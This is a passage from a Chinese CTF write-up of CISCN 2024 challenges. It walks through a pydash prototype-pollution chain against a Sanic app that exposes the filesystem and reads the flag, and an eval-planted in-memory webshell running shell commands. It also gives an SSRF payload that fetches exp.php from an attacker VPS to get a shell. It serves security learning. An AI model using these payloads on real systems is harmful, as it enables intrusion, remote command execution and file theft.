        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            index <span class="token operator">=</span> <span class="token punctuation">[</span>index<span class="token punctuation">]</span>
        <span class="token keyword">elif</span> index <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>base <span class="token operator">=</span> uri<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>directory <span class="token operator">=</span> directory
        self<span class="token punctuation">.</span>directory_view <span class="token operator">=</span> directory_view
        self<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么只要让参数<code>directory</code>为<code>/</code>，<code>directory_view</code>为True，就可以看到根目录的所有文件了</p>
<p>现在我们开始本地调试，为了方便，把前面session判断的那些源码全部注释掉，再加入一个eval方便打印信息</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic
<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html
<span class="token comment">#from sanic_session import Session</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> pydash
<span class="token comment"># pydash==5.1.2</span>


<span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>


app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span>
<span class="token comment">#Session(app)</span>


<span class="token comment">#@app.route('/', methods=['GET', 'POST'])</span>
<span class="token comment">#async def index(request):</span>
    <span class="token comment">#return html(open('static/index.html').read())</span>


<span class="token comment">#@app.route("/login")</span>
<span class="token comment">#async def login(request):</span>
    <span class="token comment">#user = request.cookies.get("user")</span>
    <span class="token comment">#if user.lower() == 'adm;n':</span>
        <span class="token comment">#request.ctx.session['admin'] = True</span>
        <span class="token comment">#return text("login success")</span>

    <span class="token comment">#return text("login fail")</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>
    value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
        pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>

<span class="token comment">#print(app.router.name_index['name'].directory_view)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试的时候发现有<code>app.router.name_index</code>可以获取注册的路由，因为之前没找到<code>app.static</code>变量于是猜测得从注册路由这里下手</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523002319518.png" alt="image-20240523002319518"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>src?a<span class="token operator">=</span><span class="token keyword">print</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">)</span>

<span class="token comment">#&#123;'__mp_main__.static': &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path>>, '__mp_main__.src': &lt;Route: name=__mp_main__.src path=src>, '__mp_main__.admin': &lt;Route: name=__mp_main__.admin path=admin>&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>那么访问对应的键值就能访问到其路由，接下来想办法进到<code>DirectoryHandler</code></p>
<p>在sanic的几个库里面全局搜一下<code>name_index</code>方法</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523004218935.png" alt="image-20240523004218935"></p>
<p>找到系统默认的调用点，然后下断点调试（vscode调试第三方库参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zlb872551601/article/details/105354738">https://blog.csdn.net/zlb872551601/article/details/105354738</a>）</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010018167.png" alt="image-20240523010018167"></p>
<p>从handler入手，可以发现<code>directory_handler</code>中的<code>directory</code>和<code>directory_view</code>变量</p>
<p>这里的name要多跟进几次得到<code>__mp_main__.static</code>（或许是因为此时sanic服务才正式启动？，又或者这个才是最后覆盖static变量的name？）</p>
<p>于是连上我们前面的链子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>name_index<span class="token punctuation">[</span><span class="token string">'__mp_main__.static'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>handler<span class="token punctuation">.</span>keywords<span class="token punctuation">[</span><span class="token string">'directory_handler'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010432983.png" alt="image-20240523010432983"></p>
<p>这样就能获取<code>directory</code>和<code>directory_view</code>的值了</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523010611341.png" alt="image-20240523010611341"></p>
<p>于是就能进行污染了</p>
<h4 id="污染directory-view"><a href="#污染directory-view" class="headerlink" title="污染directory_view"></a>污染directory_view</h4><p>payload：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意这里不能用<code>[]</code>来包裹其中的索引，污染和直接调用不同，我们需要用<code>.</code>来连接；而<code>__mp_main__</code>是一个整体，不能分开，用两个反斜杠转义即可</p>
<p>改为True后就可以访问到<code>/static/</code>下的文件了</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523011600831.png" alt="image-20240523011600831"></p>
<h4 id="污染directory"><a href="#污染directory" class="headerlink" title="污染directory"></a>污染directory</h4><p>接下来污染<code>directory</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"d:"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再次访问返回500，报错</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523011908163.png" alt="image-20240523011908163"></p>
<p>很明显不能直接将这里的值污染为一个字符串类型</p>
<p>我们回到前面调试sanic库的部分</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012203237.png" alt="image-20240523012203237"></p>
<p>这里的directory是一个对象，而值则由其中的<strong>parts</strong>属性决定，但是这个属性是一个tuple，不能直接污染，回到前面的DirectoryHandler类的源码寻找办法</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012449560.png" alt="image-20240523012449560"></p>
<p>这里的directory参数是一个Path对象，跟进Path类</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012633968.png" alt="image-20240523012633968"></p>
<p>继续跟进<code>_from_parts</code>方法</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012705002.png" alt="image-20240523012705002"></p>
<p>可以看到<code>parts</code>的值最后是给了<code>_parts</code>这个属性</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523012810707.png" alt="image-20240523012810707"></p>
<p>这是一个list，那么这里很明显我们就可以直接污染了，payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"d:"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240523013602083.png" alt="image-20240523013602083"></p>
<h4 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"/"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014010104.png" alt="image-20240523014010104"></p>
<p>然后污染<code>__file__</code>为flag的名称，再访问&#x2F;src得到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__init__\\\\.__globals__\\\\.__file__"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"/24bcbd0192e591d6ded1_flag"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="其它文件读取的方法"><a href="#其它文件读取的方法" class="headerlink" title="其它文件读取的方法"></a>其它文件读取的方法</h3><p>gxn师傅tql！</p>
<p>类似于flask中的<code>_static_url_path</code>，污染了以后可以通过路由直接访问到文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>累了，直接搬gxn师傅的图了（</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014519823.png" alt="image-20240523014519823"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'app.add_route(lambda request: __import__("os").popen(request.args.get("gxngxngxn")).read(),"/gxngxngxn", methods=["GET", "POST"])'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014542230.png" alt="image-20240523014542230"></p>
<p>于是在报错中回成功会回显命令的执行结果（或许可以在pickle条件下使用？</p>
<hr>
<h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>怎么看了半天有三种解法了？？？</p>
<p>第一天晚上专门审了下源码里ssrf的洞，第二天早上看到题目直接狂喜，以为要找另一个ssrf的洞，没想到根本不是。。</p>
<p>说是ban了第一天的洞，不过还是要打ssrf，猜测ban的是qrcode那个路由</p>
<p>那就继续看看其它调用了<code>dr_catcher_data</code>的方法</p>
<p>Run.php</p>
<p>访问<code>/index.php?s=api&amp;c=run&amp;m=cron?auth=a</code>，然后显示控制器不存在过不去了。。</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519101255367.png" alt="image-20240519101255367"></p>
<p>Phpcmf.php</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519111725580.png" alt="image-20240519111725580"></p>
<p>不可控，算了</p>
<p>Upload.php</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519100016530.png" alt="image-20240519100016530"></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519100046903.png" alt="image-20240519100046903"></p>
<p>看起来能打但是一开始调用了<code>_get_upload_params</code>验权限，所以不行</p>
<p>Image.php</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519111253356.png" alt="image-20240519111253356"></p>
<p>一路跟到这里，没收获</p>
<p>Thread.php</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519111611629.png" alt="image-20240519111611629"></p>
<p>没地方调用</p>
<p>Ueditor.php</p>
<p>没地方调用</p>
<p>Member.php</p>
<p>没地方调用</p>
<p>至此前台的所有方法全寄了</p>
<p>还是尝试爆后台路由吧，续了三次靶机，怎么可能爆出来（</p>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>那怎么办？拿前一天的payload再打一次，结果发现这次连自己内网穿透的php服务都没访问到。。。</p>
<p>赛后问了一下，好像前一天的洞确实没修，于是借了个vps，测了一下能出网，打payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//your-vps/exp.php&amp;text=abcd&amp;size=1024&amp;level=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后弹shell，现在能访问到php了，但是弹了半天弹不出来，不知道是不是curl和bash没了</p>
<p>赛后问了一下有dump源码的师傅看了一下api.php到底在搞什么（结果ctfshow那边复现不出来。。）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>dayrui<span class="token operator">/</span>Fcms<span class="token operator">/</span>Control<span class="token operator">/</span>Api<span class="token operator">/</span>Api<span class="token operator">.</span>php
<span class="token comment">/**
 * 二维码显示
 */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">qrcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'thumb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$matrixPointSize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$errorCorrectionLevel</span> <span class="token operator">=</span> <span class="token function">dr_safe_replace</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Phpcmf<span class="token punctuation">\</span>Service</span><span class="token operator">::</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">//生成二维码图片</span>
    <span class="token keyword">require_once</span> <span class="token constant">CMSPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Library/Phpqrcode.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">WRITEPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'file/qrcode-'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token operator">.</span> <span class="token variable">$thumb</span> <span class="token operator">.</span> <span class="token variable">$matrixPointSize</span> <span class="token operator">.</span> <span class="token variable">$errorCorrectionLevel</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-qrcode.png'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token constant">IS_DEV</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$QR</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>QRcode</span><span class="token operator">::</span><span class="token function">png</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$errorCorrectionLevel</span><span class="token punctuation">,</span> <span class="token variable">$matrixPointSize</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'二维码生成失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token variable">$QR</span> <span class="token operator">=</span> <span class="token function">imagecreatefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span>
                <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span>
                <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'图片地址不规范'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$hostname</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
            <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token variable">$newUrl</span> <span class="token operator">=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'://'</span> <span class="token operator">.</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$newUrl</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'?'</span> <span class="token operator">.</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
 
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ip不正确"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
 
            <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'follow_location'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$img</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此图片不是一张可用的图片'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">dr_catcher_data</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'图片参数不规范'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$logo</span> <span class="token operator">=</span> <span class="token function">imagecreatefromstring</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$QR_width</span> <span class="token operator">=</span> <span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//二维码图片宽度</span>
